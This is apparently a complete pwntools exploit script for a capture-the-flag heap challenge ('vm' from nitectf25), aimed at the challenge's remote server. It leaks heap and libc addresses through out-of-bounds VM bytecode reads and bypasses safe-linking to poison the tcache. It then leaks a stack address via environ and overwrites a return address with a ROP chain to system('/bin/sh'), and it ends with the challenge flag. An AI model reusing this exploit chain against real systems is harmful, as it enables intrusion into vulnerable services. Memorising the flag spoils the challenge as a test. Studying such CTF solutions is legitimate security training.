#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"
context.binary = exe = ELF("../challenge/vm_patched", checksec=False)
libc = ELF("../challenge/libc.so.6", checksec=False)
# context.terminal = ["tmux", "splitw", "-h"]
context.terminal = ["kitty"]


def conn():
    # r = process([exe.path])
    r = remote("virtual.chals.nitectf25.live", 1337, ssl=True)
    return r


def create_user(r, index, name):
    r.sendlineafter(b"Enter choice: ", b"1")
    r.sendlineafter(b"Enter user index (0..15): ", str(index).encode())
    r.sendlineafter(b"Enter user name (max 20 chars): ", name)


def select_user(r, index):
    r.sendlineafter(b"Enter choice: ", b"2")
    r.sendlineafter(b"Enter user index: ", str(index).encode())


def delete_user(r, index):
    r.sendlineafter(b"Enter choice: ", b"3")
    r.sendlineafter(b"Enter user index to delete: ", str(index).encode())


def create_program(r, prog_idx, size, data):
    r.sendlineafter(b"Enter choice: ", b"1")
    r.sendlineafter(b"Enter program size (bytes): ", str(size).encode())
    r.sendafter(b"Send %d bytes over stdin\n" % size, data)
    r.sendlineafter(b"Enter program index (0..9): ", str(prog_idx).encode())


def execute_program(r, prog_idx):
    r.sendlineafter(b"Enter choice: ", b"2")
    r.sendlineafter(b"Enter program number: ", str(prog_idx).encode())


def delete_program(r, prog_idx):
    r.sendlineafter(b"Enter choice: ", b"3")
    r.sendlineafter(b"Enter program number to delete: ", str(prog_idx).encode())


def back_to_main_menu(r):
    r.sendlineafter(b"Enter choice: ", b"4")


def main():
    r = conn()

    create_user(r, 0, b"arikazo0")

    select_user(r, 0)
    create_program(r, 0, 0x430, b"random_stuff")
    create_program(r, 1, 0x68, b"random_stuff")
    create_program(r, 2, 0x68, b"random_stuff")

    # push constant 13680
    # push constant 8
    # print xb
    # push constant 12560
    # push constant 8
    # print xb
    # exit

    # The offset is from ram_address + 0x1000
    # exploits the fact that only 0x4000 was allocated for vm->ram_memory
    create_program(
        r,
        3,
        0x68,
        b"\x00\x70\x35\x00\x08\x00\x19\x01\x00\x10\x31\x00\x08\x00\x19\x01\x1c",
    )

    delete_program(r, 1)
    delete_program(r, 2)
    delete_program(r, 0)
    execute_program(r, 3)

    r.recvuntil(b"Loaded")
    r.recvline()
    hexline = r.recvline().strip()

    data = bytes.fromhex(hexline.decode())
    heap_raw = data[:8]
    libc_raw = data[8:]

    heap_leak = u64(heap_raw) << 12
    libc_leak = u64(libc_raw)
    libc.address = libc_leak - 0x1E8B20
    print(f"heap leak: {hex(heap_leak)}")
    print(f"libc leak: {hex(libc.address)}")

    mask = heap_leak >> 12

    # push constant 13824
    # push constant 8
    # read
    # exit
    # writes environ to deleted program 2
    create_program(r, 4, 0x100, b"\x00\x00\x36\x00\x08\x00\x1a\x1c")
    execute_program(r, 4)
    r.sendline(p64(mask ^ (libc.symbols["environ"] - (0x68))))

    print(f"Write address: {hex(libc.symbols['environ'])}")
    print(f"Write address - 0x68: {hex(libc.symbols['environ'] - 0x68)}")

    back_to_main_menu(r)

    # deleted program address is returned here
    # user struct size is 0x68
    create_user(r, 1, "arikazo1")

    # &(environ - 0x68) is the address of this user struct. Last 20 bytes is username. After 20 bytes comes stack address
    # which is printed along with username
    create_user(r, 2, "a" * 20)

    stack_leak = u64(r.recvuntil(b"created\n").strip()[25:-8].ljust(8, b"\x00"))
    print(f"Stack leak: {hex(stack_leak)}")

    select_user(r, 0)
    create_program(r, 5, 0x100, b"random_stuff")
    create_program(r, 6, 0x100, b"random_stuff")

    # push constant 13104
    # push constant 8
    # read
    create_program(r, 7, 0x100, b"\x00\x30\x33\x00\x08\x00\x1a")
    delete_program(r, 5)
    delete_program(r, 6)

    # address of ret_addr of function that handles active user
    ret_addr = stack_leak - (0x1A0 + 0x8)
    # writes ret_addr - 0x8 to deleted program 6.
    # -0x8 because tcache was not alligned
    # canary is not present in this function.
    execute_program(r, 7)
    r.sendline(p64(mask ^ (ret_addr)))

    rop = ROP(libc)
    bin_sh = next(libc.search("/bin/sh"))
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])
    ret = rop.find_gadget(["ret"])

    rop.raw(pop_rdi)
    rop.raw(bin_sh)
    rop.raw(ret)
    rop.raw(p64(libc.symbols["system"]))

    print(rop.dump())

    create_program(r, 8, 0x100, b"random_stuff")
    create_program(r, 9, 0x100, b"A" * 8 + flat(rop.chain()))
    back_to_main_menu(r)

    r.interactive()


if __name__ == "__main__":
    main()


# nite{wh173r053_1s_7h3_k3y_70_17_4ll}
